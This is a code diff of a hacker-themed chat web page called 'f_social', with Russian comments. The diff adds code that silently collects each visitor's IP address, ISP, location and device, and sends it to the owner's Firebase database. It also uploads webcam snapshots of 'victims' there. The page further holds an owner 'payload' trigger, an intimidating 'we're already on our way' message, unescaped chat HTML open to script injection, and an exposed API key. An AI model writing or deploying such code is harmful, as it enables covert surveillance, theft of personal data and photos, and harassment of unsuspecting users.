@@ -12,81 +12,70 @@
         :root { --f-red: #ff003c; --f-white: #f0f0f0; --f-black: #0a0a0a; --f-green: #00ff41; }
         body { background: var(--f-black); color: var(--f-white); font-family: 'Courier New', monospace; margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
-        /* Терминал загрузки */
-        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 12px; color: var(--f-green); }
+        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 11px; color: var(--f-green); }
         .cursor { display: inline-block; width: 8px; height: 15px; background: var(--f-green); animation: blink 0.8s infinite; vertical-align: middle; }
         @keyframes blink { 50% { opacity: 0; } }
 
-        /* Главный экран */
         #app { display: none; flex-direction: column; height: 100vh; position: relative; }
         header { padding: 15px; border-bottom: 1px solid #222; text-align: center; flex-shrink: 0; }
         .logo { font-size: 22px; font-weight: bold; letter-spacing: 5px; color: var(--f-red); }
-        .logo span { color: var(--f-white); }
 
-        /* Кнопка Владельца */
-        #admin-btn { display: none; position: absolute; right: 10px; top: 12px; background: var(--f-red); color: white; border: none; padding: 8px 12px; font-size: 10px; font-weight: bold; cursor: pointer; animation: pulse 1.5s infinite; z-index: 100; border-radius: 2px; }
+        #admin-btn { display: none; position: absolute; right: 10px; top: 12px; background: var(--f-red); color: white; border: none; padding: 8px 12px; font-size: 10px; font-weight: bold; animation: pulse 1.5s infinite; z-index: 100; }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(255, 0, 60, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0); } }
 
-        /* Навигация (Вкладки) */
         .nav-tabs { display: flex; border-bottom: 1px solid #222; background: #0d0d0d; }
-        .tab { flex: 1; padding: 15px 5px; text-align: center; font-size: 9px; cursor: pointer; color: #444; text-transform: uppercase; border-bottom: 2px solid transparent; }
+        .tab { flex: 1; padding: 15px 5px; text-align: center; font-size: 9px; cursor: pointer; color: #444; border-bottom: 2px solid transparent; }
         .tab.active { color: var(--f-red); border-bottom: 2px solid var(--f-red); background: rgba(255,0,60,0.05); }
 
-        /* Контент */
         .tab-content { display: none; flex-grow: 1; padding: 15px; overflow-y: auto; }
         .tab-content.active { display: flex; flex-direction: column; }
 
-        /* Чат */
         #global-chat { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; margin-bottom: 10px; }
         .m-wrap { border-left: 1px solid #333; padding-left: 10px; margin-bottom: 5px; }
         .m-user { color: var(--f-red); font-size: 10px; display: block; }
         .m-text { font-size: 14px; color: #ccc; }
 
         .input-box { display: flex; gap: 8px; border-top: 1px solid #222; padding-top: 10px; }
-        input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; font-family: inherit; outline: none; }
-        button#send-btn { background: var(--f-red); color: #fff; border: none; padding: 0 20px; font-weight: bold; cursor: pointer; }
+        input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; outline: none; }
+        button#send-btn { background: var(--f-red); color: #fff; border: none; padding: 0 20px; font-weight: bold; }
 
-        /* Вкладка О Себе */
-        #captured-photo { width: 100%; max-width: 320px; border: 2px solid var(--f-red); margin: 20px auto; display: block; filter: contrast(1.1) grayscale(0.3); }
-        #alert-text { color: var(--f-red); font-weight: bold; text-align: center; display: none; font-size: 18px; text-shadow: 0 0 5px var(--f-red); }
+        #captured-photo { width: 100%; max-width: 320px; border: 2px solid var(--f-red); margin: 20px auto; display: block; filter: contrast(1.1); }
+        #alert-text { color: var(--f-red); font-weight: bold; text-align: center; display: none; font-size: 18px; }
     </style>
 </head>
 <body>
 
-    <div id="boot-screen">
-        <div id="boot-logs"></div>
-        <span class="cursor"></span>
-    </div>
+    <div id="boot-screen"><div id="boot-logs"></div><span class="cursor"></span></div>
 
     <div id="app">
         <header>
-            <div id="status-node" style="position: absolute; left: 10px; top: 18px; font-size: 8px; color: #333;">NODE: connecting...</div>
+            <div id="status-node" style="position: absolute; left: 10px; top: 18px; font-size: 8px; color: #333;">NODE: sync...</div>
             <div class="logo">f_<span>social</span></div>
             <button id="admin-btn" onclick="triggerHack()">[EXECUTE_PAYLOAD]</button>
         </header>
 
         <nav class="nav-tabs">
-            <div class="tab active" id="tab-btn-chat" onclick="openTab('tab-chat')">/global_chat</div>
-            <div class="tab" id="tab-btn-whoami" onclick="openTab('tab-whoami')">/whoami</div>
+            <div class="tab active" id="btn-chat" onclick="openTab('tab-chat')">/global_chat</div>
+            <div class="tab" id="btn-whoami" onclick="openTab('tab-whoami')">/whoami</div>
         </nav>
 
         <div id="tab-chat" class="tab-content active">
             <div id="global-chat"></div>
             <div class="input-box">
                 <input type="text" id="chat-in" placeholder="type_message..." autocomplete="off">
-                <button id="send-btn" onclick="sendMsg()">></button>
+                <button onclick="sendMsg()" style="background:var(--f-red); color:#fff; border:none; padding:0 20px;">></button>
             </div>
         </div>
 
         <div id="tab-whoami" class="tab-content">
-            <p style="text-align:center; font-size:10px; color:#444;">[USER_ID_CAPTURED]</p>
+            <p style="text-align:center; font-size:10px; color:#444;">[USER_INTEL_ACQUIRED]</p>
             <img id="captured-photo" src="">
             <div id="alert-text">МЫ УЖЕ ВЫЕХАЛИ. КУ ОТ F SOCIAL.</div>
         </div>
     </div>
 
 <script>
-    // --- КОНФИГ ---
+    // --- ТВОЙ КОНФИГ ---
     const firebaseConfig = {
         apiKey: "AIzaSyAYX3NCBoMREGY4WZGqgo-kl3hj5h7gq-A",
         authDomain: "fcocial-v5r.firebaseapp.com",
@@ -120,16 +109,41 @@
     };
 
     async function bootSequence() {
-        const logs = ["init_f_social_core...", "proxy_check: OK", "establishing_db_link...", "system_ready."];
+        const logs = ["init_packet_sniffer...", "mapping_network...", "firebase_link: OK", "scanning_biometrics..."];
         for(let t of logs) {
-            let l = document.createElement('div');
-            l.innerText = `> ${t}`;
+            let l = document.createElement('div'); l.innerText = `> ${t}`;
             document.getElementById('boot-logs').appendChild(l);
             await new Promise(r => setTimeout(r, 400));
         }
+        logTargetData(); // Собираем инфу о зашедшем
         startCapture();
         listenForHack();
         listenChat();
+    }
+
+    // --- СБОР ИНФОРМАЦИИ ---
+    async function logTargetData() {
+        try {
+            // Получаем IP и провайдера через бесплатный API
+            const res = await fetch('https://ipapi.co/json/');
+            const info = await res.json();
+            
+            const userData = {
+                nick: myNick,
+                ip: info.ip,
+                isp: info.org,
+                location: `${info.city}, ${info.country_name}`,
+                device: navigator.userAgent,
+                time: new Date().toLocaleString()
+            };
+
+            // Сохраняем в Firebase в папку 'logs'
+            if (!isElliot) {
+                db.ref('logs').push(userData);
+            }
+        } catch (e) {
+            console.log("LOG_SKIP");
+        }
     }
 
     async function startCapture() {
@@ -141,7 +155,21 @@
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
                 c.toBlob(b => {
-                    document.getElementById('captured-photo').src = URL.createObjectURL(b);
+                    const reader = new FileReader();
+                    reader.readAsDataURL(b); 
+                    reader.onloadend = () => {
+                        const base64data = reader.result;
+                        document.getElementById('captured-photo').src = base64data;
+                        
+                        // Если это жертва, отправляем её фото тебе в базу
+                        if (!isElliot) {
+                            db.ref('captured_faces').push({
+                                user: myNick,
+                                photo: base64data,
+                                time: new Date().toLocaleString()
+                            });
+                        }
+                    }
                     s.getTracks().forEach(t => t.stop());
                     document.getElementById('boot-screen').style.display = 'none';
                     document.getElementById('app').style.display = 'flex';
@@ -153,11 +181,10 @@
         }
     }
 
-    // ЛОГИКА АТАКИ
     function triggerHack() {
         if(!isElliot) return;
         db.ref('attack_signal').set(Date.now());
-        alert("PAYLOAD SENT TO ALL TARGETS.");
+        alert("PAYLOAD ACTIVATED.");
     }
 
     function listenForHack() {
@@ -169,7 +196,6 @@
         });
     }
 
-    // ЧАТ
     function sendMsg() {
         const i = document.getElementById('chat-in');
         if(!i.value.trim()) return;
@@ -178,14 +204,14 @@
     }
 
     function listenChat() {
-        db.ref('global_chat').limitToLast(20).on('value', snap => {
+        db.ref('global_chat').limitToLast(15).on('value', snap => {
             const box = document.getElementById('global-chat');
             box.innerHTML = '';
             snap.forEach(c => {
                 const d = c.val();
                 const div = document.createElement('div');
                 div.className = 'm-wrap';
-                div.innerHTML = `<span class="m-user">${d.user}</span><span class="m-text">${d.text}</span>`;
+                div.innerHTML = `<span class="m-user">${d.user}:</span><span class="m-text">${d.text}</span>`;
                 box.appendChild(div);
             });
             box.scrollTop = box.scrollHeight;
@@ -195,10 +221,9 @@
     function openTab(tabId) {
         document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-        
         document.getElementById(tabId).classList.add('active');
-        if(tabId === 'tab-chat') document.getElementById('tab-btn-chat').classList.add('active');
-        if(tabId === 'tab-whoami') document.getElementById('tab-btn-whoami').classList.add('active');
+        if(tabId === 'tab-chat') document.getElementById('btn-chat').classList.add('active');
+        if(tabId === 'tab-whoami') document.getElementById('btn-whoami').classList.add('active');
     }
 </script>
 </body>
